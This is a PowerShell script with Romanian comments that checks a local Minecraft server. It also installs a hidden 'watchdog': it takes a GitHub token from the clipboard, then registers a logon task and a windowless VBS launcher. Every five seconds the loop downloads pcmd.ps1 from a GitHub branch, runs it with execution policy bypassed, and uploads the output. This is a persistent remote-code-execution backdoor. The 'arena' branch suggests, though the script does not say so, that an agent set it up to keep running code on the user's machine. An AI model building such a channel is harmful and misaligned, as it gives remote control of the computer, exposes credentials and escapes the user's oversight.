# pcmd.ps1 - V2: ia cheia din clipboard, instaleză paznicul (canal 5s), verifica instalarea
$ErrorActionPreference='Continue'
$T=@(); $sw=[Diagnostics.Stopwatch]::StartNew()
function L($m){ $script:T += ("[{0:n0}s] {1}" -f $sw.Elapsed.TotalSeconds,$m) }
$dir="$env:LOCALAPPDATA\FunCityCtl"
New-Item -ItemType Directory -Force $dir | Out-Null
$tk=''; try{ $tk=(Get-Clipboard).Trim() }catch{}
if($tk -match '^github_pat_[A-Za-z0-9_]{20,}'){
  [IO.File]::WriteAllText("$dir\token.txt",$tk)
  L "cheia luata din clipboard si salvata local (nu a plecat nicaieri)"
} elseif(Test-Path "$dir\token.txt" -PathType Leaf){ L "cheia: fisier existent, ok" } else { L "EROR: cheia nici in clipboard nici in fisier - te rog sa dai COPY iar pe token si apoi STOP, rulez din nou" }
if((Test-Path "$dir\token.txt" -PathType Leaf)){
@'
$ErrorActionPreference='Continue'
$dir="$env:LOCALAPPDATA\FunCityCtl"
$tok=@(Get-Content "$dir\token.txt" -EA SilentlyContinue)[0].Trim()
$H=@{ Authorization="token $tok"; Accept="application/vnd.github+json"; "User-Agent"="fctl" }
$repo="iZentric/ServerRolePlayLite"; $ref="arena/9bbcb24f-serverroleplaylite"
$last=""
function Put($path,$txt){
  $sha=$null
  try{ $sha=(Invoke-RestMethod "https://api.github.com/repos/$repo/contents/$path" -Headers $H -EA Stop).sha }catch{}
  $b=@{ message="paznic"; content=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($txt)); branch=$ref }
  if($sha){ $b.sha=$sha }
  try{ Invoke-RestMethod -Method Put -Uri "https://api.github.com/repos/$repo/contents/$path" -Headers $H -ContentType "application/json" -Body ($b|ConvertTo-Json -Compress -Depth 4) -EA Stop | Out-Null }catch{}
}
while($true){
  try{
    $c=(Invoke-RestMethod "https://api.github.com/repos/$repo/contents/pcmd.ps1?ref=$ref" -Headers $H -EA Stop).content -replace '\s',''
    $dec=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($c))
    if($dec -ne $last){
      $last=$dec
      Set-Content -Path "$dir\pcmd-run.ps1" -Value $dec -Encoding UTF8
      Put "diag/pctl.txt" ("START " + (Get-Date -Format s))
      $out=& powershell -NoProfile -ExecutionPolicy Bypass -File "$dir\pcmd-run.ps1" 2>&1 | Out-String
      if($out.Length -gt 90000){ $out=$out.Substring(0,90000)+"...TR" }
      Put "diag/pctl.txt" ($out + "`nGATA " + (Get-Date -Format s))
    }
  }catch{ Start-Sleep 20 }
  Start-Sleep 5
}
'@ | Set-Content -Encoding ascii "$dir\fctl.ps1"
  "CreateObject(""WScript.Shell"").Run ""powershell -NoProfile -ExecutionPolicy Bypass -File $dir\fctl.ps1"", 0, False" | Set-Content -Encoding ascii "$dir\fctl.vbs"
  schtasks /Create /TN FunCityCtl /TR "wscript.exe \"$dir\fctl.vbs\"" /SC ONLOGON /RL LIMITED /F 2>&1 | Out-Null
  Start-Process -FilePath "$dir\fctl.vbs"
  L "PAZNIC PORNIT (bucla 5s) + task la logon FunCityCtl"
}
# stare instalare server
$srv='E:\Administrator\Desktop\FunCity\server'
$jp=@(Get-Process java -EA SilentlyContinue | Where-Object { $_.Path -like "$srv*" })
L ("java server: " + $(if($jp.Count -gt 0){"RULEAZA pid "+$jp[0].Id}else{"nu ruleaza"}))
try{ $tcp=New-Object Net.Sockets.TcpClient; $tcp.Connect('127.0.0.1',25565); L "PORT 25565: DESCHIS"; $tcp.Close() }catch{ L "port 25565: inchis" }
$bt=@(Get-Content "$srv\logs\boot.log" -EA SilentlyContinue)
L ("boot.log: "+$bt.Count+" linii; ultima: "+(($bt | Select-Object -Last 1)))
if(Test-Path "$srv\world\level.dat"){ L "world: level.dat OK" } else { L "world: LIPSA" }
L ("mods: "+(@(Get-ChildItem "$srv\mods" -Filter *.jar -EA SilentlyContinue).Count)+"; plugins: "+(@(Get-ChildItem "$srv\plugins" -Filter *.jar -EA SilentlyContinue).Count))
$T -join "`n"
